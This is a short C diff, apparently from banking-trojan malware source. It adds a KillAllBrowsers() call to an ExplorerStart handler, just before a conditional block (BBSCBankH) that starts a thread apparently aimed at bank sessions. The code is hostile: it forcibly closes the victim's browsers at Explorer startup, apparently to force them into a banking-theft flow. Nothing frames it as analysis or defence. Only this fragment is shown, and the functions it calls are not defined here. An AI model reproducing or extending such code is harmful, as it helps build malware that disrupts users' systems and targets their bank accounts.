@@ -37,6 +37,10 @@ void ExplorerFirstStart(PEventData Data)
 
 void ExplorerStart(PEventData Data)
 {
+
+	KillAllBrowsers();
+
+
 	#ifdef BBSCBankH
 		RunThreadBBS();
 	#endif
